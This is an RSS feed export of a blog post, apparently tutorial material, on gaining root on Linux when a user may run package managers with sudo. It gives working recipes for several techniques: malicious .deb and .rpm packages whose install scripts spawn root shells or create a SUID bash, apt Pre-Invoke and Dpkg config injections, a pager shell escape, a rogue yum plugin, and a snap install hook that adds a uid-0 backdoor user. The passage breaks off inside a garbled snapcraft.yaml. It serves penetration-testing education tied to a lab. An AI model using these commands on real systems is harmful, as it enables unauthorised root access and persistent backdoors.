<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on ikuamike</title>
    <link>https://blog.ikuamike.io/posts/</link>
    <description>Recent content in Posts on ikuamike</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Â© Michael Ikua</copyright>
    <lastBuildDate>Sun, 08 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux Privilege Escalation - Package Managers</title>
      <link>https://blog.ikuamike.io/posts/2021/package_managers_privesc/</link>
      <pubDate>Sun, 08 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/package_managers_privesc/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/package.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Package managers are run with root permissions on linux distributions to install,
update or remove software/packages. In certain cases the user should not be a root/admin user but
has been assigned sudo permissions to run the package manager only for package management
purposes.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll look at how this permission can be abused to gain root access to the machine via a root shell.&lt;/p&gt;
&lt;p&gt;If you would like to test out these commands in a lab environment without the need to install and setup your own machine have a look
at my scenario on &lt;a href=&#34;https://app.cyberranges.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;CYBERRANGES&lt;/strong&gt;&lt;/a&gt;

 using the link below.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://app.cyberranges.com/scenario/610d49c873fe0c0007a989f7&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Linux Privilege Escalation: Package Managers Scenario&lt;/a&gt;

&lt;/p&gt;
&lt;h2 id=&#34;package-managers&#34;&gt;Package Managers&lt;/h2&gt;
&lt;p&gt;For debian based linux distributions we have several package managers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;apt/apt-get&lt;/li&gt;
&lt;li&gt;dpkg&lt;/li&gt;
&lt;li&gt;aptitude&lt;/li&gt;
&lt;li&gt;synaptic&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From the list APT (Advanced Packaging Tool) is the most common one that is used. Synaptic
is a GUI application that supports similar features to the command line ones. Packages
are usually in .deb files.&lt;/p&gt;
&lt;p&gt;For redhat based distributions we have:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;yum (Yellowdog Updater, Modified)&lt;/li&gt;
&lt;li&gt;rpm&lt;/li&gt;
&lt;li&gt;dnf&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Packages are usually .rpm files.&lt;/p&gt;
&lt;p&gt;There&amp;rsquo;s another package manager called &lt;code&gt;snap&lt;/code&gt; that supports all major linux distros. Therefore,
for our case it works on both debian and redhat based distros.&lt;/p&gt;
&lt;p&gt;In this tutorial we&amp;rsquo;re taking the position of a low privileged user that only has permission to run one of the
above package managers as sudo.&lt;/p&gt;
&lt;h2 id=&#34;exploitation-deb&#34;&gt;Exploitation: DEB&lt;/h2&gt;
&lt;p&gt;Here I have an ubuntu server, the user has the permission to run &lt;code&gt;apt&lt;/code&gt; with sudo.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;method-1-creating-a-malicious-debian-package&#34;&gt;Method 1: Creating a malicious debian package&lt;/h3&gt;
&lt;p&gt;The low privileged user can create a debian package that contains commands to escalate the privileges.&lt;/p&gt;
&lt;p&gt;To start off we&amp;rsquo;ll create a directory called &lt;code&gt;exploit&lt;/code&gt; then create a shell script that runs &lt;code&gt;whoami&lt;/code&gt; command and put in the folder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;mkdir exploit
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#!/bin/bash&amp;#39;&lt;/span&gt; &amp;gt; exploit/exploit.sh
echo whoami &amp;gt;&amp;gt; exploit/exploit.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With that ready we&amp;rsquo;ll use a tool called fpm (Effing package management) to build a debian package that will execute
the script we have just created.&lt;/p&gt;
&lt;p&gt;To create the debian package we&amp;rsquo;ll run the below fpm command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;fpm -n exploit -s dir -t deb --before-install ./exploit/exploit.sh ./exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Next we install the package via apt using the below command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo apt install ./exploit_1.0_amd64.deb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;There we see the command gets executed as root, now we can run any command as root. From there you can use different
strategies to get a root shell like adding ssh keys to the root user or getting a reverse shell.&lt;/p&gt;
&lt;p&gt;For our case here, we&amp;rsquo;ll just change the &lt;code&gt;whoami&lt;/code&gt; command to &lt;code&gt;bash&lt;/code&gt; in the exploit.sh script then create a new
debian package. But this time specify a new version to upgrade the existing one that we installed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;fpm -n exploit -s dir -t deb -v 1.1 --before-install ./exploit/exploit.sh ./exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We&amp;rsquo;ve successfully got an interactive shell as root. This also applies to apt-get and dpkg.&lt;/p&gt;
&lt;h3 id=&#34;method-2-apt-configuration-options&#34;&gt;Method 2: APT Configuration Options&lt;/h3&gt;
&lt;p&gt;APT is a high-level command line interface for the package management system. This means it serves a front end interface for the
more low level &lt;code&gt;dpkg&lt;/code&gt; package manager.&lt;/p&gt;
&lt;p&gt;When apt calls dpkg you can specify shell commands to run before (Pre-Invoke) or after (Post-Invoke) the invokation happens.&lt;/p&gt;
&lt;p&gt;The above can be configured using configuration files. These configuration files are stored in /etc/apt/apt.conf.d. However,
in the case where you are trying to escalate privileges the low privileged user may not have the permissions to create files
in that directory.&lt;/p&gt;
&lt;p&gt;APT supports specifying this configurations on the commandline as well by using the &lt;code&gt;-o&lt;/code&gt; option. Using this we can run the following
commands to get a root shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo apt update -o APT::Update::Pre-Invoke::&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo apt update -o APT::Update::Post-Invoke::&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since apt interacts with dpkg we can also use dpkg like configurations to get a root shell but a bit differently.
We can&amp;rsquo;t pass dpkg configurations directly to apt&amp;rsquo;s commandline options therefore we need to use a configuration file.&lt;/p&gt;
&lt;p&gt;APT allows us to specify a configuration file to use in addition to the default configuration via command line option &lt;code&gt;-c&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create a malicious config file and use it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Dpkg::Pre-Invoke {&amp;#34;/bin/bash&amp;#34;}&amp;#39;&lt;/span&gt; &amp;gt; badconfig
sudo apt install -c badconfig netcat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;For the above to work the package you choose should not be presently installed on the system.&lt;/p&gt;
&lt;p&gt;The techniques here also work with apt-get.&lt;/p&gt;
&lt;h3 id=&#34;method-3-invoking-the-default-pager&#34;&gt;Method 3: Invoking the default pager&lt;/h3&gt;
&lt;p&gt;When viewing changelog, apt/apt-get will display it using sensible-pager which is usually set to &lt;code&gt;less&lt;/code&gt; by default. This means that apt
will run less and because less will also be running as root we can get a root shell from it.&lt;/p&gt;
&lt;p&gt;Run the first command then when in the pager interface, run the second command. This also works with apt-get.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo apt changelog apt
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exploitation-rpm&#34;&gt;Exploitation: RPM&lt;/h2&gt;
&lt;p&gt;Here I have a centos 7 server. Similar to above section we start with a low privileged user that can run &lt;code&gt;yum&lt;/code&gt; as sudo.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;method-1-creating-a-malicious-rpm-package&#34;&gt;Method 1: Creating a malicious rpm package&lt;/h3&gt;
&lt;p&gt;Using the same technique as earlier we&amp;rsquo;ll create a malicious rpm package using fpm. We&amp;rsquo;ll use the ubuntu machine to create the
package then transfer it to the centos server.&lt;/p&gt;
&lt;p&gt;In this case dropping into a shell doesn&amp;rsquo;t work, we therefore need to run a command that will give us shell access differently. I will create an
suid bash binary that will give us root access.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll create the exploit folder and exploit.sh script inside of /tmp. Then put the below command in the script.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd /tmp
mkdir exploit
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#!/bin/bash&amp;#39;&lt;/span&gt; &amp;gt; exploit/exploit.sh
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; exploit/exploit.sh
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chmod +xs /tmp/bash&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; exploit/exploit.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we&amp;rsquo;ll create the malicious rpm package using a similar command to the debian package.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we can transfer it to the centos server by launching a python http server and downloading it.&lt;/p&gt;
&lt;p&gt;on ubuntu server:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;python3 -m http.server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;on centos server:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget http://192.168.125.10:8000/exploit-1.0-1.x86_64.rpm 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once successfully downloaded we will install the package and the included script will be executed to create our
suid bash binary.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo yum localinstall -y exploit-1.0-1.x86_64.rpm

/tmp/bash -p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We have successfully gained a root shell.&lt;/p&gt;
&lt;h3 id=&#34;method-2-loading-a-custom-yum-plugin&#34;&gt;Method 2: Loading a custom yum plugin&lt;/h3&gt;
&lt;p&gt;Yum provides plugins that extend and enhance its operations. Certain plugins are installed by default.
Yum always informs you which plugins, if any, are loaded and active whenever you call any yum command.&lt;/p&gt;
&lt;p&gt;As shown below, when we run the yum update command we can see the loaded plugin.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-17.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From yum man page:&lt;/p&gt;
&lt;p&gt;A plugin is a Python &amp;ldquo;.py&amp;rdquo; file which is installed in one of the directories specified by the &lt;code&gt;pluginpath&lt;/code&gt; option in yum.conf.&lt;/p&gt;
&lt;p&gt;For a plugin to work, the following conditions must be met:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. The plugin module file must be installed in the plugin path as just described.
2. The global plugins option in /etc/yum.conf must be set to &#39;1&#39;.
3. A configuration file for the plugin must exist in 
   /etc/yum/pluginconf.d/&amp;lt;plugin_name&amp;gt;.conf and the enabled setting in this file 
   must set to &#39;1&#39;. The minimal content for such a configuration file is:

    [main]
    enabled = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;From yum.conf man page, there are several plugin configurations that can be set:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;plugins&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Either &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt;. Global switch to enable or disable yum plugins. Default is &lt;code&gt;0&lt;/code&gt; (plugins disabled). See the PLUGINS section of the yum(8) man for more information on installing yum plugins.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;pluginpath&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A list of directories where yum should look for plugin modules. Default is &lt;code&gt;/usr/share/yum-plugins&lt;/code&gt; and &lt;code&gt;/usr/lib/yum-plugins&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;pluginconfpath&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A list of directories where yum should look for plugin configuration files.  Default is &lt;code&gt;/etc/yum/pluginconf.d&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using this information we can look at yum.conf on our centos server.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-18.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We see that plugins are currently enabled, but there&amp;rsquo;s not entry for the other options meaning the default options apply.&lt;/p&gt;
&lt;p&gt;We can confirm this by seeing the fastestmirror plugin file and configuration.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-19.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we are ready to perform the exploit. Since as a low privileged user we cannot write the default plugin directories, we need to use a
configuration file that specifies directories we have permission to write.&lt;/p&gt;
&lt;p&gt;Fortunately, yum allows us to specify a configuration file via the commandline via the &lt;code&gt;-c&lt;/code&gt; option. Let&amp;rsquo;s create a configuration
file called &lt;code&gt;custom_yum.conf&lt;/code&gt; with the below contents.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd /tmp
cat &amp;gt;custom_yum.conf&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[main]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;plugins=1
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pluginpath=/tmp/badplugin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pluginconfpath=/tmp/badplugin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next let&amp;rsquo;s create the plugin configuration file, but put it in the badplugin folder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;mkdir badplugin
cat &amp;gt;badplugin/badplugin.conf&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[main]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;enabled=1
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then create the plugin itself.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;cat &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;badplugin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;badplugin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;EOF
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; yum.plugins &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE, API_VERSION
requires_api_version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;API_VERSION
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;init_hook&lt;/span&gt;(conduit):
  os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execl(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt;)
EOF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we can execute the plugin with the below command and get a root shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo yum -c custom_yum.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-20.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;exploitation-snap&#34;&gt;Exploitation: Snap&lt;/h2&gt;
&lt;p&gt;As snap works on all major distros, I&amp;rsquo;ll be showcasing this on our ubuntu server. The low privileged user has the
ability to run snap with sudo permissions.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-16.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;creating-a-malicious-snap-package&#34;&gt;Creating a malicious snap package&lt;/h3&gt;
&lt;p&gt;Creation of a malicious snap package can be achieved in 2 ways, using the fpm command which we&amp;rsquo;ve already used and using snapcraft.&lt;/p&gt;
&lt;p&gt;The idea behind the creation of the package is the same, when creating a snap package you can specify hooks.&lt;/p&gt;
&lt;p&gt;According to the documentation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A hook is an executable file that runs within a snapâs confined environment when a certain action occurs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;One of the hooks that is supported by snap is called &lt;code&gt;install&lt;/code&gt; hook.&lt;/p&gt;
&lt;p&gt;According to the documentation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;install&lt;/code&gt; hook is called upon initial install only, i.e. itâs not called on subsequent refreshes.&lt;/p&gt;
&lt;p&gt;The hook is executed before starting snap services (if it has any) and before the configure hook. The install hook is the place for one-time
actions, such as an early initialisation of a resource when installed for the first time.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can create this &lt;code&gt;install&lt;/code&gt; hook as a shell script that will execute our malicious command when we try to
install the package.&lt;/p&gt;
&lt;h4 id=&#34;1-snapcraft&#34;&gt;1. Snapcraft&lt;/h4&gt;
&lt;p&gt;Let&amp;rsquo;s setup our environment.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;mkdir exploit
cd exploit
snapcraft init
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The snapcraft init command create a &lt;code&gt;snap&lt;/code&gt; directory and the file &lt;code&gt;snapcraft.yaml&lt;/code&gt; inside it.&lt;/p&gt;
&lt;p&gt;Next change into the snap directory then create a &lt;code&gt;hooks&lt;/code&gt; directory and &lt;code&gt;install&lt;/code&gt; file inside.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd snap
mkdir hooks
touch hooks/install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we will put our malicious commands in the install file and make it and executable bash script.&lt;/p&gt;
&lt;p&gt;Since our goal is to obtain a root shell, we will use another technique of adding a new user with uid 0 to give us
root privileges. You can also use a reverse shell command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;/usr/sbin/useradd -p &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;openssl passwd -1 password123&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -u &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -o -s /bin/bash -m pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Don&amp;rsquo;t forget to make the script executable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;chmod +x hooks/install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now let&amp;rsquo;s edit the snapcraft.yaml file, we&amp;rsquo;ll change the default name, summary and description and also delete the base entry.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;exploit&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# you probably want to &amp;#39;snapcraft register &amp;lt;name&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0.1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# just for humans, typically &amp;#39;1.2+git&amp;#39; or &amp;#39;1.3.2&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;summary&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;privesc exploit&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;description&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  privesc exploit
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  grade: devel # must be &amp;#39;stable&amp;#39; to release into candidate/stable channels
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  confinement: devmode # use &amp;#39;strict&amp;#39; once you have the right plugs and slots
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  parts:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    my-part:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        # See &amp;#39;snapcraft plugins&amp;#39;&lt;/span&gt;  
